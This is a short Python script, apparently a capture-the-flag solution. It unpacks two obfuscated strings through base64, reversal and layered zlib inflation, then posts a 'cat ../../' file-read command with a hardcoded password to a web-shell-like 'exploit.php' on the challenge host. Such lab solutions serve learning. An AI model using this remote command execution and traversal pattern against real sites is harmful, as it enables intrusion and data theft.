from base64 import b64decode
from zlib import decompressobj, decompress
from requests import post


def gz_inflate(data: bytes) -> bytes:
    de = decompressobj()
    return de.decompress(b'x\x9c' + data)

if __name__ == '__main__':
    Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41"
    Lix = "\x3doGpLtxkd2FOpWJ2\x433njS1L\x41/TuvtT9\x63GFe3FV95Gh6vs\x63rGWqEXX\x612vlrp8/7j\x61GTW\x61\x62\x2bj6\x413Y5\x2bW\x41UxKktziFl\x62hn\x42O/jeQR\x62gl4JJHN6gyD3uJRLU/koJZJMPrWDloQhJXZ\x61pf35rL1mwmdOm\x437nlJwjXeQLumhdDzz\x41Qu39Q55\x62gyRo\x42rxSQd2rZYU9yZ\x41\x2bmt1YWWSdukn\x62Z3ML1oXtu\x61d3DjIGl\x63nS3R559WPwQUPqMYlp3LL\x438DulT\x43xISq7ukwxj\x43Sr\x43lJ7UX\x43s9LGK7IP\x41L5H4JeTM5PZrHOXLJj4\x634\x2binwIDyIe4I\x63SKL\x63ur2Wz45\x2bhe92rr3\x2bDJZ8jlLQ3f3oQ\x43N7\x43NEXKrJ0G3\x63RimUf\x41dNZYt1LZ\x43vHshH7h8Ry7FD\x42ME\x2b0TQ2m/lHgG\x42wJe\x2brd\x41lEg/VHgK\x42wJe\x2br\x63\x411Eg/FHgO\x42wJe\x2br\x62\x41FFg/1GgS\x42wJe"
    Cyto_de = gz_inflate(b64decode(Cyto))
    print(Cyto_de)
    Lix_de = (gz_inflate(decompress(gz_inflate(decompress(gz_inflate(decompress(gz_inflate(decompress(b64decode(Lix[::-1]))))))))))
    print(Lix_de)
    print(post('http://challenges.wsi.edu.pl:5015/plugins/toast/exploit.php', data={'command': 'cat ../../c85ebe2c-213c-4593-b6e7-f908440ee066.txt', 'password': 'S3cr3tP4ssw0rd'}).content.split(b'pre')[1])